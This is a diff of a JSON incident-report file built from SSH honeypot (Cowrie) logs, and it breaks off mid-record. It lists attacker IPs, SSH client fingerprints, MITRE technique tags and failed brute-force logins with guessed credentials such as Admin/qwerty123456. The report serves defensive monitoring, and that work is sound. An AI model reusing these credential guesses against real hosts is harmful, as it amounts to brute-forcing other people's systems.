@@ -1,159 +1,47 @@
 {
-  "generated_at": "2026-04-02T07:08:46Z",
-  "total_cases": 15,
+  "generated_at": "2026-04-02T08:53:44Z",
+  "total_cases": 25,
   "cases": [
     {
-      "case_id": "IR-2b0e6ec0c130",
-      "src_ip": "219.128.15.190",
-      "first_seen": "2026-04-02T05:43:46.593488Z",
-      "last_seen": "2026-04-02T05:43:50.826352Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
+      "case_id": "IR-5c54cacd5c97",
+      "src_ip": "123.56.157.254",
+      "first_seen": "2026-04-02T07:16:20.756801Z",
+      "last_seen": "2026-04-02T07:18:20.858202Z",
+      "duration_seconds": 120,
+      "login_attempts": 0,
       "login_success": false,
       "commands": [],
       "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
+      "ttps": [],
       "severity": "LOW",
       "timeline": [
         {
           "eventid": "cowrie.session.connect",
-          "src_ip": "219.128.15.190",
-          "src_port": 45002,
+          "src_ip": "123.56.157.254",
+          "src_port": 36460,
           "dst_ip": "172.31.34.72",
           "dst_port": 2222,
           "protocol": "ssh",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:43:46.593488Z",
+          "timestamp": "2026-04-02T07:16:20.756801Z",
           "event": "cowrie.session.connect"
         },
         {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:43:47.509784Z",
-          "src_ip": "219.128.15.190",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:43:47.510674Z",
-          "src_ip": "219.128.15.190",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "config",
-          "password": "5555555",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:43:49.169364Z",
-          "src_ip": "219.128.15.190",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
           "eventid": "cowrie.session.closed",
-          "duration": "4.2",
+          "duration": "120.1",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:43:50.826352Z",
-          "src_ip": "219.128.15.190",
+          "timestamp": "2026-04-02T07:18:20.858202Z",
+          "src_ip": "123.56.157.254",
           "protocol": "ssh",
           "event": "cowrie.session.closed"
         }
       ]
     },
     {
-      "case_id": "IR-909826bb88d9",
-      "src_ip": "118.123.116.93",
-      "first_seen": "2026-04-02T05:47:59.541859Z",
-      "last_seen": "2026-04-02T05:48:03.445490Z",
+      "case_id": "IR-877684f5504c",
+      "src_ip": "20.228.193.165",
+      "first_seen": "2026-04-02T07:19:59.665615Z",
+      "last_seen": "2026-04-02T07:20:02.952753Z",
       "duration_seconds": 3,
       "login_attempts": 1,
       "login_success": false,
@@ -167,21 +55,21 @@
       "timeline": [
         {
           "eventid": "cowrie.session.connect",
-          "src_ip": "118.123.116.93",
-          "src_port": 44218,
+          "src_ip": "20.228.193.165",
+          "src_port": 49108,
           "dst_ip": "172.31.34.72",
           "dst_port": 2222,
           "protocol": "ssh",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:47:59.541859Z",
+          "timestamp": "2026-04-02T07:19:59.665615Z",
           "event": "cowrie.session.connect"
         },
         {
           "eventid": "cowrie.client.version",
           "version": "SSH-2.0-OpenSSH_7.4",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:48:00.162007Z",
-          "src_ip": "118.123.116.93",
+          "timestamp": "2026-04-02T07:20:00.071456Z",
+          "src_ip": "20.228.193.165",
           "protocol": "ssh",
           "event": "cowrie.client.version"
         },
@@ -270,753 +158,18 @@
             ""
           ],
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:48:00.162922Z",
-          "src_ip": "118.123.116.93",
+          "timestamp": "2026-04-02T07:20:00.072178Z",
+          "src_ip": "20.228.193.165",
           "protocol": "ssh",
           "event": "cowrie.client.kex"
         },
         {
           "eventid": "cowrie.login.failed",
-          "username": "debian",
-          "password": "99999",
+          "username": "test",
+          "password": "7",
           "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:48:02.041644Z",
-          "src_ip": "118.123.116.93",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "3.9",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T05:48:03.445490Z",
-          "src_ip": "118.123.116.93",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-a1ed12c647bc",
-      "src_ip": "124.107.185.138",
-      "first_seen": "2026-04-02T06:00:37.207127Z",
-      "last_seen": "2026-04-02T06:00:40.908826Z",
-      "duration_seconds": 3,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "124.107.185.138",
-          "src_port": 43558,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:00:37.207127Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:00:37.678681Z",
-          "src_ip": "124.107.185.138",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:00:37.679464Z",
-          "src_ip": "124.107.185.138",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "guest",
-          "password": "8",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:00:39.401885Z",
-          "src_ip": "124.107.185.138",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "3.7",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:00:40.908826Z",
-          "src_ip": "124.107.185.138",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-45f8d7f7c292",
-      "src_ip": "187.218.57.50",
-      "first_seen": "2026-04-02T06:03:30.681772Z",
-      "last_seen": "2026-04-02T06:03:34.688172Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "187.218.57.50",
-          "src_port": 33599,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:03:30.681772Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:03:31.358813Z",
-          "src_ip": "187.218.57.50",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:03:31.359522Z",
-          "src_ip": "187.218.57.50",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "support",
-          "password": "555555",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:03:33.073957Z",
-          "src_ip": "187.218.57.50",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "4.0",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:03:34.688172Z",
-          "src_ip": "187.218.57.50",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-0df86fb11290",
-      "src_ip": "180.168.60.146",
-      "first_seen": "2026-04-02T06:08:24.076368Z",
-      "last_seen": "2026-04-02T06:08:27.798774Z",
-      "duration_seconds": 3,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "180.168.60.146",
-          "src_port": 34446,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:08:24.076368Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:08:24.545620Z",
-          "src_ip": "180.168.60.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
-            "hmac-sha2-256",
-            "hmac-sha2-512",
-            "hmac-md5",
-            "hmac-md5-96",
-            "hmac-ripemd160",
-            "hmac-ripemd160@openssh.com",
-            "umac-64@openssh.com",
-            "umac-128@openssh.com",
-            "hmac-sha1-etm@openssh.com",
-            "hmac-sha1-96-etm@openssh.com",
-            "hmac-sha2-256-etm@openssh.com",
-            "hmac-sha2-512-etm@openssh.com",
-            "hmac-md5-etm@openssh.com",
-            "hmac-md5-96-etm@openssh.com",
-            "hmac-ripemd160-etm@openssh.com",
-            "umac-64-etm@openssh.com",
-            "umac-128-etm@openssh.com"
-          ],
-          "compCS": [
-            "none",
-            "zlib@openssh.com",
-            "zlib"
-          ],
-          "langCS": [
-            ""
-          ],
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:08:24.546309Z",
-          "src_ip": "180.168.60.146",
-          "protocol": "ssh",
-          "event": "cowrie.client.kex"
-        },
-        {
-          "eventid": "cowrie.login.failed",
-          "username": "Admin",
-          "password": "qwerty123456",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:08:26.149795Z",
-          "src_ip": "180.168.60.146",
-          "protocol": "ssh",
-          "event": "cowrie.login.failed"
-        },
-        {
-          "eventid": "cowrie.session.closed",
-          "duration": "3.7",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:08:27.798774Z",
-          "src_ip": "180.168.60.146",
-          "protocol": "ssh",
-          "event": "cowrie.session.closed"
-        }
-      ]
-    },
-    {
-      "case_id": "IR-9c25e390c128",
-      "src_ip": "192.200.205.244",
-      "first_seen": "2026-04-02T06:20:26.626623Z",
-      "last_seen": "2026-04-02T06:20:30.651018Z",
-      "duration_seconds": 4,
-      "login_attempts": 1,
-      "login_success": false,
-      "commands": [],
-      "downloads": [],
-      "ttps": [
-        "T1110.001",
-        "T1592"
-      ],
-      "severity": "LOW",
-      "timeline": [
-        {
-          "eventid": "cowrie.session.connect",
-          "src_ip": "192.200.205.244",
-          "src_port": 45706,
-          "dst_ip": "172.31.34.72",
-          "dst_port": 2222,
-          "protocol": "ssh",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:20:26.626623Z",
-          "event": "cowrie.session.connect"
-        },
-        {
-          "eventid": "cowrie.client.version",
-          "version": "SSH-2.0-OpenSSH_7.4",
-          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
-          "timestamp": "2026-04-02T06:20:27.299608Z",
-          "src_ip": "192.200.205.244",
-          "protocol": "ssh",
-          "event": "cowrie.client.version"
-        },
-        {
-          "eventid": "cowrie.client.kex",
-          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
-          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
-          "kexAlgs": [
-            "diffie-hellman-group1-sha1",
-            "diffie-hellman-group14-sha1",
-            "diffie-hellman-group14-sha256",
-            "diffie-hellman-group16-sha512",
-            "diffie-hellman-group18-sha512",
-            "diffie-hellman-group-exchange-sha1",
-            "diffie-hellman-group-exchange-sha256",
-            "ecdh-sha2-nistp256",
-            "ecdh-sha2-nistp384",
-            "ecdh-sha2-nistp521",
-            "curve25519-sha256",
-            "curve25519-sha256@libssh.org",
-            "ext-info-c"
-          ],
-          "keyAlgs": [
-            "ssh-ed25519",
-            "ssh-ed25519-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp256",
-            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp384",
-            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
-            "ecdsa-sha2-nistp521",
-            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
-            "ssh-rsa",
-            "ssh-rsa-cert-v01@openssh.com",
-            "ssh-dss",
-            "ssh-dss-cert-v01@openssh.com"
-          ],
-          "encCS": [
-            "des",
-            "3des",
-            "blowfish",
-            "none",
-            "3des-cbc",
-            "blowfish-cbc",
-            "cast128-cbc",
-            "arcfour",
-            "arcfour128",
-            "arcfour256",
-            "aes128-cbc",
-            "aes192-cbc",
-            "aes256-cbc",
-            "rijndael-cbc@lysator.liu.se",
-            "aes128-ctr",
-            "aes192-ctr",
-            "aes256-ctr",
-            "aes128-gcm@openssh.com",
-            "aes256-gcm@openssh.com",
-            "chacha20-poly1305@openssh.com"
-          ],
-          "macCS": [
-            "hmac-sha1",
-            "hmac-sha1-96",
